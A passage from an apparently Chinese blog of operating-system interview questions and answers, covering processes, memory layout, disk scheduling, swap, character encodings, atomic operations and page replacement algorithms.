href="https://blog.csdn.net/linkedin_35878439/article/details/81288889">https://blog.csdn.net/linkedin_35878439/article/details/81288889</a></p><p>《01_fork()的使用》：<a href="https://blog.csdn.net/WUZHU2017/article/details/81636851">https://blog.csdn.net/WUZHU2017/article/details/81636851</a></p></blockquote><h4 id="37、局部性原理你知道吗？主要有哪两大局部性原理？各自是什么？"><a href="#37、局部性原理你知道吗？主要有哪两大局部性原理？各自是什么？" class="headerlink" title="37、局部性原理你知道吗？主要有哪两大局部性原理？各自是什么？"></a>37、局部性原理你知道吗？主要有哪两大局部性原理？各自是什么？</h4><p>主要分为时间局部性和空间局部性。</p><p>时间局部性:如果执行了程序中的某条指令，那么不久后这条指令很有可能再次执行;如果某个数据被访问过，不久之后该数据很可能再次被访问。(因为程序中存在大量的循环)<br>空间局部性:一旦程序访问了某个存储单元，在不久之后，其附近的存储单元也很有可能被访问。(因为很多数据在内存中都是连续存放的，并且程序的指令也是顺序地在内存中存放的)</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/QQ截图202102270008.png" alt=""></p><h4 id="38、父进程、子进程、进程组、作业和会话"><a href="#38、父进程、子进程、进程组、作业和会话" class="headerlink" title="38、父进程、子进程、进程组、作业和会话"></a>38、父进程、子进程、进程组、作业和会话</h4><p><strong>父进程</strong></p><p>已创建一个或多个子进程的进程</p><p><strong>子进程</strong></p><p>由fork创建的新进程被称为子进程（child process）。该函数被调用一次，但返回两次。两次返回的区别是子进程的返回值是0，而父进程的返回值则是新进程（子进程）的进程 id。将子进程id返回给父进程的理由是：因为一个进程的子进程可以多于一个，没有一个函数使一个进程可以获得其所有子进程的进程id。对子进程来说，之所以fork返回0给它，是因为它随时可以调用getpid()来获取自己的pid；也可以调用getppid()来获取父进程的id。(进程id 0总是由交换进程使用，所以一个子进程的进程id不可能为0 )。</p><p>fork之后，操作系统会复制一个与父进程完全相同的子进程，虽说是父子关系，但是在操作系统看来，他们更像兄弟关系，这2个进程共享代码空间，但是数据空间是互相独立的，子进程数据空间中的内容是父进程的完整拷贝，指令指针也完全相同，子进程拥有父进程当前运行到的位置（两进程的程序计数器pc值相同，也就是说，子进程是从fork返回处开始执行的），但有一点不同，如果fork成功，子进程中fork的返回值是0，父进程中fork的返回值是子进程的进程号，如果fork不成功，父进程会返回错误。</p><p>子进程从父进程继承的有：1.进程的资格(真实(real)/有效(effective)/已保存(saved)用户号(UIDs)和组号(GIDs))2.环境(environment)3.堆栈4.内存5.进程组号</p><p>独有：1.进程号；2.不同的父进程号(译者注：即子进程的父进程号与父进程的父进程号不同， 父进程号可由getppid函数得到)；3.资源使用(resource utilizations)设定为0</p><p><strong>进程组</strong></p><p>进程组就是多个进程的集合，其中肯定有一个组长，其进程PID等于进程组的PGID。只要在某个进程组中一个进程存在，该进程组就存在，这与其组长进程是否终止无关。</p><p><strong>作业</strong></p><p>shell分前后台来控制的不是进程而是作业（job）或者进程组（Process Group）。</p><p>一个前台作业可以由多个进程组成，一个后台也可以由多个进程组成，shell可以运行一个前台作业和任意多个后台作业，这称为作业控制</p><p><code>为什么只能运行一个前台作业？</code><br>答：当我们在前台新起了一个作业，shell就被提到了后台，因此shell就没有办法再继续接受我们的指令并且解析运行了。 但是如果前台进程退出了，shell就会有被提到前台来，就可以继续接受我们的命令并且解析运行。</p><p>作业与进程组的区别：如果作业中的某个进程有创建了子进程，则该子进程是不属于该作业的。<br>一旦作业运行结束，shell就把自己提到前台（子进程还存在，但是子进程不属于作业），如果原来的前台进程还存在（这个子进程还没有终止），他将自动变为后台进程组</p><p><strong>会话</strong></p><p>会话（Session）是一个或多个进程组的集合。一个会话可以有一个控制终端。在xshell或者WinSCP中打开一个窗口就是新建一个会话。</p><h4 id="39、进程终止的几种方式"><a href="#39、进程终止的几种方式" class="headerlink" title="39、进程终止的几种方式"></a>39、进程终止的几种方式</h4><p>1、main函数的自然返回，<code>return</code><br>2、调用<code>exit</code>函数，属于c的函数库<br>3、调用<code>_exit</code>函数，属于系统调用<br>4、调用<code>abort</code>函数，异常程序终止，同时发送SIGABRT信号给调用进程。<br>5、接受能导致进程终止的信号：ctrl+c (^C)、SIGINT(SIGINT中断进程) </p><p><strong>exit和_exit的区别</strong></p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/1568016798542.png" alt=""></p><blockquote><p>《学习笔记]进程终止的5种方式》：<a href="https://www.cnblogs.com/shichuan/p/4432503.html">https://www.cnblogs.com/shichuan/p/4432503.html</a></p></blockquote><h4 id="40、Linux中异常和中断的区别"><a href="#40、Linux中异常和中断的区别" class="headerlink" title="40、Linux中异常和中断的区别"></a>40、Linux中异常和中断的区别</h4><p><strong>中断</strong></p><p>大家都知道，当我们在敲击键盘的同时就会产生中断，当硬盘读写完数据之后也会产生中断，所以，我们需要知道，中断是由硬件设备产生的，而它们从物理上说就是电信号，之后，它们通过中断控制器发送给CPU，接着CPU判断收到的中断来自于哪个硬件设备（这定义在内核中），最后，由CPU发送给内核，有内核处理中断。下面这张图显示了中断处理的流程：</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/SouthEast.png" alt=""></p><p><strong>异常</strong></p><p>我们在学习《计算机组成原理》的时候会知道两个概念，CPU处理程序的时候一旦程序不在内存中，会产生缺页异常；当运行除法程序时，当除数为0时，又会产生除0异常。所以，大家也需要记住的是，<strong>异常是由CPU产生的，同时，它会发送给内核，要求内核处理这些异常</strong>，下面这张图显示了异常处理的流程：</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/SouthEasts.png" alt=""></p><p><strong>相同点</strong></p><ul><li><p>最后都是由CPU发送给内核，由内核去处理</p></li><li><p>处理程序的流程设计上是相似的</p></li></ul><p><strong>不同点</strong></p><ul><li>产生源不相同，异常是由CPU产生的，而中断是由硬件设备产生的</li><li>内核需要根据是异常还是中断调用不同的处理程序</li><li>中断不是时钟同步的，这意味着中断可能随时到来；异常由于是CPU产生的，所以它是时钟同步的</li><li>当处理中断时，处于中断上下文中；处理异常时，处于进程上下文中</li></ul><blockquote><p>《Linux内核—异常和中断的区别》：<a href="https://blog.csdn.net/u011068464/article/details/10284741">https://blog.csdn.net/u011068464/article/details/10284741</a></p></blockquote><h4 id="41、Windows和Linux环境下内存分布情况"><a href="#41、Windows和Linux环境下内存分布情况" class="headerlink" title="41、Windows和Linux环境下内存分布情况"></a>41、Windows和Linux环境下内存分布情况</h4><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/QQ截图20210227001141.png" alt=""></p><p>通过这张图你可以看到，用户空间内存，从<strong>低到高</strong>分别是 7 种不同的内存段：</p><ul><li>程序文件段，包括二进制可执行代码；</li><li>已初始化数据段，包括静态常量；</li><li>未初始化数据段，包括未初始化的静态变量；</li><li>堆段，包括动态分配的内存，从低地址开始向上增长；</li><li>文件映射段，包括动态库、共享内存等，从低地址开始向上增长（跟硬件和内核版本有关）</li><li>栈段，包括局部变量和函数调用的上下文等。栈的大小是固定的，一般是 <code>8 MB</code>。当然系统也提供了参数，以便我们自定义大小；</li></ul><h4 id="42、一个由C-c编译的程序占用的内存分为哪几个部分？"><a href="#42、一个由C-c编译的程序占用的内存分为哪几个部分？" class="headerlink" title="42、一个由C/c编译的程序占用的内存分为哪几个部分？"></a>42、一个由C/c编译的程序占用的内存分为哪几个部分？</h4><p>1、栈区（stack）— 地址向下增长，由编译器自动分配释放，存放函数的参数值，局部变量的值等。其操作方式类似于数据结构中的队列，先进后出。</p><p>2、堆区（heap）— 地址向上增长，一般由程序员分配释放，若程序员不释放，程序结束时可能由OS回收。注意它与数据结构中的堆是两回事，分配方式倒是类似于链表。</p><p>3、全局区（静态区）（static）—全局变量和静态变量的存储是放在一块的，初始化的全局变量和静态变量在一块区域，未初始化的全局变量和未初始化的静态变量在相邻的另一块区域。 - 程序结束后有系统释放</p><p>4、文字常量区 —常量字符串就是放在这里的。程序结束后由系统释放</p><p>5、程序代码区(text)—存放函数体的二进制代码。 </p><h4 id="43、一般情况下在Linux-windows平台下栈空间的大小"><a href="#43、一般情况下在Linux-windows平台下栈空间的大小" class="headerlink" title="43、一般情况下在Linux/windows平台下栈空间的大小"></a>43、一般情况下在Linux/windows平台下栈空间的大小</h4><p>Linux环境下有操作系统决定，一般是8KB，8192kbytes，通过ulimit命令查看以及修改</p><p>Windows环境下由编译器决定，VC++6.0一般是1M</p><p><strong>Linux</strong></p><p>linux下非编译器决定栈大小，而是由操作系统环境决定，默认是8192KB（8M）；而在Windows平台下栈的大小是被记录在可执行文件中的（由编译器来设置)，即：windows下可以由编译器决定栈大小，而在Linux下是由系统环境变量来控制栈的大小的。</p><p> 在Linux下通过如下命令可查看和设置栈的大小：</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">ulimit</span> <span class="token parameter variable">-a</span>            <span class="token comment"># 显示当前栈的大小 （ulimit为系统命令，非编译器命令）       </span>$ <span class="token builtin class-name">ulimit</span> <span class="token parameter variable">-s</span> <span class="token number">32768</span>      <span class="token comment"># 设置当前栈的大小为32M</span></code></pre><p><strong>Windows</strong></p><p>下程序栈空间的大小，VC++ 6.0 默认的栈空间是1M。</p><p>VC6.0中修改堆栈大小的方法：</p><ul><li>选择 “Project-&gt;Setting”</li><li>选择 “Link”</li><li>选择 “Category”中的 “Output”</li><li>在 “Stack allocations”中的”Reserve:”中输栈的大小</li></ul><blockquote><p>《Linux/windows栈大小》：<a href="https://blog.csdn.net/HQ354974212/article/details/76087676">https://blog.csdn.net/HQ354974212/article/details/76087676</a></p></blockquote><h4 id="44、程序从堆中动态分配内存时，虚拟内存上怎么操作的"><a href="#44、程序从堆中动态分配内存时，虚拟内存上怎么操作的" class="headerlink" title="44、程序从堆中动态分配内存时，虚拟内存上怎么操作的"></a>44、程序从堆中动态分配内存时，虚拟内存上怎么操作的</h4><p>页表：是一个存放在物理内存中的数据结构，它记录了虚拟页与物理页的映射关系</p><p>在进行动态内存分配时，例如malloc()函数或者其他高级语言中的new关键字，操作系统会在硬盘中创建或申请一段虚拟内存空间，并更新到页表（分配一个页表条目（PTE），使该PTE指向硬盘上这个新创建的虚拟页），通过PTE建立虚拟页和物理页的映射关系。</p><h4 id="45、常见的几种磁盘调度算法"><a href="#45、常见的几种磁盘调度算法" class="headerlink" title="45、常见的几种磁盘调度算法"></a>45、常见的几种磁盘调度算法</h4><p>读写一个磁盘块的时间的影响因素有：</p><ul><li>旋转时间（主轴转动盘面，使得磁头移动到适当的扇区上）</li><li>寻道时间（制动手臂移动，使得磁头移动到适当的磁道上）</li><li>实际的数据传输时间</li></ul><p>其中，寻道时间最长，因此磁盘调度的主要目标是使磁盘的平均寻道时间最短。</p><h5 id="1-先来先服务"><a href="#1-先来先服务" class="headerlink" title="1. 先来先服务"></a>1. 先来先服务</h5><p>按照磁盘请求的顺序进行调度。</p><p>优点是公平和简单。缺点也很明显，因为未对寻道做任何优化，使平均寻道时间可能较长。</p><h5 id="2-最短寻道时间优先"><a href="#2-最短寻道时间优先" class="headerlink" title="2. 最短寻道时间优先"></a>2. 最短寻道时间优先</h5><p>优先调度与当前磁头所在磁道距离最近的磁道。</p><p>虽然平均寻道时间比较低，但是不够公平。如果新到达的磁道请求总是比一个在等待的磁道请求近，那么在等待的磁道请求会一直等待下去，也就是出现饥饿现象。具体来说，两端的磁道请求更容易出现饥饿现象。</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/QQ截图20210226235631.png" alt=""></p><h5 id="3-电梯扫描算法"><a href="#3-电梯扫描算法" class="headerlink" title="3. 电梯扫描算法"></a>3. 电梯扫描算法</h5><p>电梯总是保持一个方向运行，直到该方向没有请求为止，然后改变运行方向。</p><p>电梯算法（扫描算法）和电梯的运行过程类似，总是按一个方向来进行磁盘调度，直到该方向上没有未完成的磁盘请求，然后改变方向。</p><p>因为考虑了移动方向，因此所有的磁盘请求都会被满足，解决了 SSTF 的饥饿问题。</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/QQ截图20210226235707.png" alt=""></p><h4 id="46、交换空间与虚拟内存的关系"><a href="#46、交换空间与虚拟内存的关系" class="headerlink" title="46、交换空间与虚拟内存的关系"></a>46、交换空间与虚拟内存的关系</h4><p><strong>交换空间</strong><br>Linux 中的交换空间（Swap space）在<strong>物理内存</strong>（RAM）被充满时被使用。如果系统需要更多的内存资源，而物理内存已经充满，内存中不活跃的页就会被移到交换空间去。虽然交换空间可以为带有少量内存的机器提供帮助，但是这种方法不应该被当做是对内存的取代。交换空间位于硬盘驱动器上，它比进入物理内存要慢。<br>交换空间可以是一个专用的交换分区（推荐的方法），交换文件，或两者的组合。<br>交换空间的总大小应该相当于你的计算机内存的两倍和 32 MB这两个值中较大的一个，但是它不能超过 2048MB（2 GB）。<br><strong>虚拟内存</strong><br>虚拟内存是文件数据交叉链接的活动文件。是WINDOWS目录下的一个”WIN386.SWP”文件，这个文件会不断地扩大和自动缩小。<br>就速度方面而言,CPU的L1和L2缓存速度最快，内存次之，硬盘再次之。但是<strong>虚拟内存使用的是硬盘的空间</strong>，为什么我们要使用速度最慢的硬盘来做 为虚拟内存呢？因为电脑中所有运行的程序都需要经过内存来执行，如果执行的程序很大或很多，就会导致我们只有可怜的256M/512M内存消耗殆尽。而硬盘空间动辄几十G上百G，为了解决这个问题，Windows中运用了虚拟内存技术，即拿出一部分硬盘空间来充当内存使用。 </p><blockquote><p>《交换空间和虚拟内存的区别》：<a href="https://blog.csdn.net/qsd007/article/details/1567955">https://blog.csdn.net/qsd007/article/details/1567955</a></p></blockquote><h4 id="47、抖动你知道是什么吗？它也叫颠簸现象"><a href="#47、抖动你知道是什么吗？它也叫颠簸现象" class="headerlink" title="47、抖动你知道是什么吗？它也叫颠簸现象"></a>47、抖动你知道是什么吗？它也叫颠簸现象</h4><p>刚刚换出的页面马上又要换入内存，刚刚换入的页面马上又要换出外存，这种频繁的页面调度行为称为抖动，或颠簸。产生抖动的主要原因是进程频繁访问的页面数目高于可用的物理块数(分配给进程的物理块不够)</p><p>为进程分配的物理块太少，会使进程发生抖动现象。为进程分配的物理块太多，又会降低系统整体的并发度，降低某些资源的利用率<br>为了研究为应该为每个进程分配多少个物理块，Denning 提出了进程工作集” 的概念</p><h4 id="48、从堆和栈上建立对象哪个快？（考察堆和栈的分配效率比较）"><a href="#48、从堆和栈上建立对象哪个快？（考察堆和栈的分配效率比较）" class="headerlink" title="48、从堆和栈上建立对象哪个快？（考察堆和栈的分配效率比较）"></a>48、从堆和栈上建立对象哪个快？（考察堆和栈的分配效率比较）</h4><p>从两方面来考虑：</p><ul><li><p>分配和释放，堆在分配和释放时都要调用函数（malloc,free)，比如分配时会到堆空间去寻找足够大小的空间（因为多次分配释放后会造成内存碎片），这些都会花费一定的时间，具体可以看看malloc和free的源代码，函数做了很多额外的工作，而栈却不需要这些。</p></li><li><p>访问时间，访问堆的一个具体单元，需要两次访问内存，第一次得取得指针，第二次才是真正的数据，而栈只需访问一次。另外，堆的内容被操作系统交换到外存的概率比栈大，栈一般是不会被交换出去的。</p></li></ul><h4 id="49、常见内存分配方式有哪些？"><a href="#49、常见内存分配方式有哪些？" class="headerlink" title="49、常见内存分配方式有哪些？"></a>49、常见内存分配方式有哪些？</h4><p><strong>内存分配方式</strong></p><p>（1） 从静态存储区域分配。内存在程序编译的时候就已经分配好，这块内存在程序的整个运行期间都存在。例如全局变量，static变量。</p><p>（2） 在栈上创建。在执行函数时，函数内局部变量的存储单元都可以在栈上创建，函数执行结束时这些存储单元自动被释放。栈内存分配运算内置于处理器的指令集中，效率很高，但是分配的内存容量有限。</p><p>（3） 从堆上分配，亦称动态内存分配。程序在运行的时候用malloc或new申请任意多少的内存，程序员自己负责在何时用free或delete释放内存。动态内存的生存期由我们决定，使用非常灵活，但问题也最多。</p><h4 id="50、常见内存分配内存错误"><a href="#50、常见内存分配内存错误" class="headerlink" title="50、常见内存分配内存错误"></a>50、常见内存分配内存错误</h4><p>（1）内存分配未成功，却使用了它。</p><p>编程新手常犯这种错误，因为他们没有意识到内存分配会不成功。常用解决办法是，在使用内存之前检查指针是否为NULL。如果指针p是函数的参数，那么在函数的入口处用assert(p!=NULL)进行检查。如果是用malloc或new来申请内存，应该用if(p==NULL) 或if(p!=NULL)进行防错处理。</p><p>（2）内存分配虽然成功，但是尚未初始化就引用它。</p><p>犯这种错误主要有两个起因：一是没有初始化的观念；二是误以为内存的缺省初值全为零，导致引用初值错误（例如数组）。内存的缺省初值究竟是什么并没有统一的标准，尽管有些时候为零值，我们宁可信其无不可信其有。所以无论用何种方式创建数组，都别忘了赋初值，即便是赋零值也不可省略，不要嫌麻烦。</p><p>（3）内存分配成功并且已经初始化，但操作越过了内存的边界。</p><p>例如在使用数组时经常发生下标“多1”或者“少1”的操作。特别是在for循环语句中，循环次数很容易搞错，导致数组操作越界。</p><p>（4）忘记了释放内存，造成内存泄露。</p><p>含有这种错误的函数每被调用一次就丢失一块内存。刚开始时系统的内存充足，你看不到错误。终有一次程序突然挂掉，系统出现提示：内存耗尽。动态内存的申请与释放必须配对，程序中malloc与free的使用次数一定要相同，否则肯定有错误（new/delete同理）。</p><p>（5）释放了内存却继续使用它。常见于以下有三种情况：</p><ul><li><p>程序中的对象调用关系过于复杂，实在难以搞清楚某个对象究竟是否已经释放了内存，此时应该重新设计数据结构，从根本上解决对象管理的混乱局面。</p></li><li><p>函数的return语句写错了，注意不要返回指向“栈内存”的“指针”或者“引用”，因为该内存在函数体结束时被自动销毁。</p></li><li><p>使用free或delete释放了内存后，没有将指针设置为NULL。导致产生“野指针”。</p></li></ul><blockquote><p>《内存分配方式及常见错误》：<a href="https://www.cnblogs.com/skynet/archive/2010/12/03/1895045.html">https://www.cnblogs.com/skynet/archive/2010/12/03/1895045.html</a></p></blockquote><p>应该在外存(磁盘)的什么位置保存被换出的进程?</p><h4 id="51、内存交换中，被换出的进程保存在哪里？"><a href="#51、内存交换中，被换出的进程保存在哪里？" class="headerlink" title="51、内存交换中，被换出的进程保存在哪里？"></a>51、内存交换中，被换出的进程保存在哪里？</h4><p>保存在磁盘中，也就是外存中。具有对换功能的操作系统中，通常把磁盘空间分为文件区和对换区两部分。文件区主要用于存放文件，主要追求存储空间的利用率，因此对文件区空间的管理采用离散分配方式;对换区空间只占磁盘空间的小部分，被换出的进程数据就存放在对换区。由于对换的速度直接影响到系统的整体速度，因此对换区空间的管理主要追求换入换出速度，因此通常对换区采用连续分配方式(学过文件管理章节后即可理解)。总之，对换区的I/O速度比文件区的更快。</p><h4 id="52、在发生内存交换时，有些进程是被优先考虑的？你可以说一说吗？"><a href="#52、在发生内存交换时，有些进程是被优先考虑的？你可以说一说吗？" class="headerlink" title="52、在发生内存交换时，有些进程是被优先考虑的？你可以说一说吗？"></a>52、在发生内存交换时，有些进程是被优先考虑的？你可以说一说吗？</h4><p>可优先换出阻塞进程;可换出优先级低的进程;为了防止优先级低的进程在被调入内存后很快又被换出，有的系统还会考虑进程在内存的驻留时间…<br>(注意: PCB 会常驻内存，不会被换出外存)</p><h4 id="53、ASCII、Unicode和UTF-8编码的区别？"><a href="#53、ASCII、Unicode和UTF-8编码的区别？" class="headerlink" title="53、ASCII、Unicode和UTF-8编码的区别？"></a>53、ASCII、Unicode和UTF-8编码的区别？</h4><p><strong>ASCII</strong></p><p>ASCII 只有127个字符，表示英文字母的大小写、数字和一些符号，但由于其他语言用ASCII 编码表示字节不够，例如：常用中文需要两个字节，且不能和ASCII冲突，中国定制了GB2312编码格式，相同的，其他国家的语言也有属于自己的编码格式</p><p><strong>Unicode</strong></p><p>由于每个国家的语言都有属于自己的编码格式，在多语言编辑文本中会出现乱码，这样Unicode应运而生，Unicode就是将这些语言统一到一套编码格式中，通常两个字节表示一个字符，而ASCII是一个字节表示一个字符，这样如果你编译的文本是全英文的，用Unicode编码比ASCII编码需要多一倍的存储空间，在存储和传输上就十分不划算</p><p><strong>UTF-8</strong></p><p>为了解决上述问题，又出现了把Unicode编码转化为“<strong>可变长编码</strong>”UTF-8编码，UTF-8编码将Unicode字符按数字大小编码为1-6个字节，英文字母被编码成一个字节，常用汉字被编码成三个字节，如果你编译的文本是纯英文的，那么用UTF-8就会非常节省空间，并且ASCII码也是UTF-8的一部分</p><p><strong>三者之间的联系</strong></p><p>搞清楚了ASCII、Unicode和UTF-8的关系，我们就可以总结一下现在计算机系统通用的字符编码工作方式：</p><p>(1) 在计算机内存中，统一使用Unicode编码，当需要保存到硬盘或者需要传输的时候，就转换为UTF-8编码</p><p>(2)用记事本编辑的时候，从文件读取的UTF-8字符被转换为Unicode字符到内存里，编辑完成后，保存的时候再把Unicode转换为UTF-8保存到文件。如下图（截取他人图片）</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/1476336-20181111103304982-1332214140.png" alt=""></p><p>浏览网页的时候，服务器会把动态生成的Unicode内容转换为UTF-8再传输到浏览器：</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/1476336-20181111103441194-1585229609.png" alt=""></p><blockquote><p>《字符编码中ASCII、Unicode和UTF-8的区别》：<a href="https://www.cnblogs.com/moumoon/p/10988234.html">https://www.cnblogs.com/moumoon/p/10988234.html</a></p></blockquote><h4 id="54、原子操作的是如何实现的"><a href="#54、原子操作的是如何实现的" class="headerlink" title="54、原子操作的是如何实现的"></a>54、原子操作的是如何实现的</h4><p><strong>处理器使用基于对缓存加锁或总线加锁的方式来实现多处理器之间的原子操作。</strong>首先处理器会自动保证基本的内存操作的原子性。处理器保证从系统内存中读取或者写入一个字节是原子的，意思是当一个处理器读取一个字节时，其他处理器不能访问这个字节的内存地址。Pentium 6和最新的处理器能自动保证单处理器对同一个缓存行里进行16/32/64位的操作是原子的，但是复杂的内存操作处理器是不能自动保证其原子性的，比如跨总线宽度、跨多个缓存行和跨页表的访问。但是，处理器提供总线锁定和缓存锁定两个机制来保证复杂内存操作的原子性。</p><p>（1）使用总线锁保证原子性<br>第一个机制是通过总线锁保证原子性。如果多个处理器同时对共享变量进行读改写操作（i++就是经典的读改写操作），那么共享变量就会被多个处理器同时进行操作，这样读改写操作就不是原子的，操作完之后共享变量的值会和期望的不一致。举个例子，如果i=1，我们进行两次i++操作，我们期望的结果是3，但是有可能结果是2，如图下图所示。</p><pre class="language-c" data-language="c"><code class="language-c">CPU1    CPU2 i<span class="token operator">=</span><span class="token number">1</span>     i<span class="token operator">=</span><span class="token number">1</span> i<span class="token operator">+</span><span class="token number">1</span>     i<span class="token operator">+</span><span class="token number">1</span> i<span class="token operator">=</span><span class="token number">2</span>     i<span class="token operator">=</span><span class="token number">2</span></code></pre><p>原因可能是多个处理器同时从各自的缓存中读取变量i，分别进行加1操作，然后分别写入系统内存中。那么，想要保证读改写共享变量的操作是原子的，就必须保证CPU1读改写共享变量的时候，CPU2不能操作缓存了该共享变量内存地址的缓存。</p><p>处理器使用总线锁就是来解决这个问题的。<strong>所谓总线锁就是使用处理器提供的一个LOCK＃信号，当一个处理器在总线上输出此信号时，其他处理器的请求将被阻塞住，那么该处理器可以独占共享内存。</strong></p><p>（2）使用缓存锁保证原子性<br>第二个机制是通过缓存锁定来保证原子性。在同一时刻，我们只需保证对某个内存地址的操作是原子性即可，但<strong>总线锁定把CPU和内存之间的通信锁住了</strong>，这使得锁定期间，其他处理器不能操作其他内存地址的数据，所以总线锁定的开销比较大，目前处理器在某些场合下使用缓存锁定代替总线锁定来进行优化。</p><p>频繁使用的内存会缓存在处理器的L1、L2和L3高速缓存里，那么原子操作就可以直接在处理器内部缓存中进行，并不需要声明总线锁，在Pentium 6和目前的处理器中可以使用“缓存锁定”的方式来实现复杂的原子性。所谓“缓存锁定”是指内存区域如果被缓存在处理器的缓存行中，并且在Lock操作期间被锁定，那么当它执行锁操作回写到内存时，处理器不在总线上声言LOCK＃信号，而是修改内部的内存地址，并允许它的缓存一致性机制来保证操作的原子性，因为<strong>缓存一致性机制会阻止同时修改由两个以上处理器缓存的内存区域数据，当其他处理器回写已被锁定的缓存行的数据时，会使缓存行无效，在如上图所示的例子中，当CPU1修改缓存行中的i时使用了缓存锁定，那么CPU2就不能使用同时缓存i的缓存行。</strong></p><p>但是有两种情况下处理器不会使用缓存锁定。<br>第一种情况是：当操作的数据不能被缓存在处理器内部，或操作的数据跨多个缓存行（cache line）时，则处理器会调用总线锁定。<br>第二种情况是：有些处理器不支持缓存锁定。对于Intel 486和Pentium处理器，就算锁定的内存区域在处理器的缓存行中也会调用总线锁定。</p><blockquote><p>《原子操作的实现原理》：<a href="https://blog.csdn.net/zxx901221/article/details/83033998">https://blog.csdn.net/zxx901221/article/details/83033998</a></p></blockquote><h4 id="55、内存交换你知道有哪些需要注意的关键点吗？"><a href="#55、内存交换你知道有哪些需要注意的关键点吗？" class="headerlink" title="55、内存交换你知道有哪些需要注意的关键点吗？"></a>55、内存交换你知道有哪些需要注意的关键点吗？</h4><ol><li>交换需要备份存储，通常是快速磁盘，它必须足够大，并且提供对这些内存映像的直接访问。</li><li>为了有效使用CPU，需要每个进程的执行时间比交换时间长，而影响交换时间的主要是转移时间，转移时间与所交换的空间内存成正比。</li><li>如果换出进程，比如确保该进程的内存空间成正比。</li><li>交换空间通常作为磁盘的一整块，且独立于文件系统，因此使用就可能很快。</li><li>交换通常在有许多进程运行且内存空间吃紧时开始启动，而系统负荷降低就暂停。</li><li>普通交换使用不多，但交换的策略的某些变种在许多系统中（如UNIX系统）仍然发挥作用。</li></ol><h4 id="56、系统并发和并行，分得清吗？"><a href="#56、系统并发和并行，分得清吗？" class="headerlink" title="56、系统并发和并行，分得清吗？"></a>56、系统并发和并行，分得清吗？</h4><p>并发是指宏观上在一段时间内能同时运行多个程序，而并行则指同一时刻能运行多个指令。</p><p>并行需要硬件支持，如多流水线、多核处理器或者分布式计算系统。</p><p>操作系统通过引入进程和线程，使得程序能够并发运行。</p><h4 id="57、可能是最全的页面置换算法总结了"><a href="#57、可能是最全的页面置换算法总结了" class="headerlink" title="57、可能是最全的页面置换算法总结了"></a>57、可能是最全的页面置换算法总结了</h4><h5 id="1、最佳置换法-OPT"><a href="#1、最佳置换法-OPT" class="headerlink" title="1、最佳置换法(OPT)"></a>1、最佳置换法(OPT)</h5><p>最佳置换算法(OPT，Optimal) :每次选择淘汰的页面将是以后永不使用，或者在最长时间内不再被访问的页面，这样可以保证最低的缺页率。<br><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/QQ截图20210226214419.png" alt=""><br>最佳置换算法可以保证最低的缺页率，但实际上，只有在进程执行的过程中才能知道接下来会访问到的是哪个页面。操作系统无法提前预判页面访问序列。因此，最佳置换算法是无法实现的</p><h5 id="2、先进先出置换算法-FIFO"><a href="#2、先进先出置换算法-FIFO" class="headerlink" title="2、先进先出置换算法(FIFO)"></a>2、先进先出置换算法(FIFO)</h5><p>先进先出置换算法(FIFO) :每次选择淘汰的页面是最早进入内存的页面<br>实现方法:把调入内存的页面根据调入的先后顺序排成一个队列，需要换出页面时选择队头页面队列的最大长度取决于系统为进程分配了多少个内存块。<br><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/QQ截图20210226214449.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/QQ截图20210227001257.png" alt="">Belady异常—当为进程分配的物理块数增大时，缺页次数不减反增的异常现象。</p><p>只有FIFO算法会产生Belady异常，而LRU和OPT算法永远不会出现Belady异常。另外，FIFO算法虽然实现简单，但是该算法与进程实际运行时的规律不适应，因为先进入的页面也有可能最经常被访问。因此，算法性能差</p><p>FIFO的性能较差，因为较早调入的页往往是经常被访问的页，这些页在FIFO算法下被反复调入和调出，并且有Belady现象。所谓Belady现象是指：采用FIFO算法时，如果对—个进程未分配它所要求的全部页面，有时就会出现分配的页面数增多但缺页率反而提高的异常现象。</p><h5 id="3、最近最久未使用置换算法-LRU"><a href="#3、最近最久未使用置换算法-LRU" class="headerlink" title="3、最近最久未使用置换算法(LRU)"></a>3、最近最久未使用置换算法(LRU)</h5><p>最近最久未使用置换算法(LRU，least recently used) :每次淘汰的页面是最近最久未使用的页面<br>实现方法:赋予每个页面对应的页表项中，用访问字段记录该页面自.上次被访问以来所经历的时间t(该算法的实现需要专门的硬件支持，虽然算法性能好，但是实现困难，开销大)。当需要淘汰一个页面时，选择现有页面中t值最大的，即最近最久未使用的页面。</p><p>LRU性能较好，但需要寄存器和栈的硬件支持。LRU是堆栈类算法，理论上可以证明，堆栈类算法不可能出现Belady异常。</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/QQ截图20210227001351.png" alt=""><br>在手动做题时，若需要淘汰页面，可以逆向检查此时在内存中的几个页面号。在逆向扫描过程中最后一个出现的页号就是要淘汰的页面。</p><h5 id="4、时钟置换算法-CLOCK"><a href="#4、时钟置换算法-CLOCK" class="headerlink" title="4、时钟置换算法(CLOCK)"></a>4、时钟置换算法(CLOCK)</h5><p>最佳置换算法性OPT能最好，但无法实现；先进先出置换算法实现简单，但算法性能差；最近最久未使用置换算法性能好，是最接近OPT算法性能的，但是实现起来需要专门的硬件支持，算法开销大。</p><p>所以操作系统的设计者尝试了很多算法，试图用比较小的开销接近LRU的性能，这类算法都是CLOCK算法的变体，因为算法要循环扫描缓冲区像时钟一样转动。所以叫clock算法。</p><p>时钟置换算法是一种性能和开销较均衡的算法，又称CLOCK算法，或最近未用算法(NRU，Not Recently 